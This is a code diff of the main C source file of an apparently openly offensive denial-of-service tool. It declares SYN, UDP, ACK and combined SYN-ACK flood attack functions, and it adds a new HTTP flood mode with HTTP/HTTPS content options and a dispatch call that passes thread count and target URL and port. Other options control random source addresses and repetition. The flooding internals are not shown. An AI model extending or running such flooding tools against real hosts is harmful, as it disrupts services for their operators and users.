@@ -20,10 +20,11 @@ extern void wronginput(const char *input_parameter);
 extern void usage(void);
 
 /* attack function */
-extern int syn_flood_attack(const char *url, const int port, ...);
-extern int udp_flood_attack(const char *url, const int port, ...);
-extern int ack_flood_attack(const char *url, const int port, ...);
-extern int syn_ack_joint_flood_attack(const char *url, const int port, ...);
+extern int syn_flood_attack(char *url, int port, ...);
+extern int udp_flood_attack(char *url, int port, ...);
+extern int ack_flood_attack(char *url, int port, ...);
+extern int syn_ack_joint_flood_attack(char *url, int port, ...);
+extern int http_flood_attack(char *url, int port, ...);
 
 void quit(int sig)
 {
@@ -44,6 +45,10 @@ int main(int argc, char *argv[])
     version_show();
     info("running...");
 
+#ifdef DEBUG
+    warning("debug mode");
+#endif
+
     static char *option_string = "u:p:a:t:h";
     int option_index = 0;
     int c;
@@ -59,6 +64,8 @@ int main(int argc, char *argv[])
         {"repeat-times", required_argument, NULL, 4},
         {"udp-dynamic-packet", no_argument, NULL, 5},
         {"udp-dynamic-dst-port", no_argument, NULL, 6},
+        {"http-content", required_argument, NULL, 7},
+        {"https-content", required_argument, NULL, 8},
         {0, 0, 0, 0},
     };
 
@@ -74,6 +81,8 @@ int main(int argc, char *argv[])
     int rep = RANDOM_SOURCE_ADDRESS_REPETITION_DEFAULT;
     int udp_dp = DISABLE;
     int udp_ddp = DISABLE;
+    char http_content[MAX_PATH_LENGTH] = {'\0'};
+    char https_content[MAX_PATH_LENGTH] = {'\0'};
 
     char cc[5] = {'\0'};
     while (1)
@@ -133,6 +142,12 @@ int main(int argc, char *argv[])
         case 6:
             udp_ddp = ENABLE;
             break;
+        case 7:
+            strncpy(http_content, optarg, MAX_PATH_LENGTH);
+            break;
+        case 8:
+            strncpy(https_content, optarg, MAX_PATH_LENGTH);
+            break;
         case '?':
             sprintf(cc, "%d", c);
             wronginput(cc);
@@ -162,6 +177,9 @@ int main(int argc, char *argv[])
         break;
     case SYN_ACK_JOINT_FLOOD_ATTACK:
         syn_ack_joint_flood_attack(url, port, randsaddr, rep, thread_number, saddr, sport);
+        break;
+    case HTTP_FLOOD_ATTACK:
+        http_flood_attack(url, port, http_content, https_content, thread_number);
         break;
     default:
         wronginput("-a or --attack-mode");
